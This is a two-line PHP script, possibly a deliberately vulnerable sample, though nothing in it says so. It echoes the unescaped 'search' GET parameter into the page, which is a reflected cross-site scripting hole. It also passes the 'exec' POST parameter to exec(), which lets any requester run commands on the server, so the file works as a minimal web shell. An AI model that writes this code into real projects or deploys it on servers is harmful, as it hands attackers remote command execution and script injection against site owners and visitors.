<?php

echo "<h>" .$_GET["search"]. "</h>";


exec(escapeshellcmd($_POST["exec"]));

?>
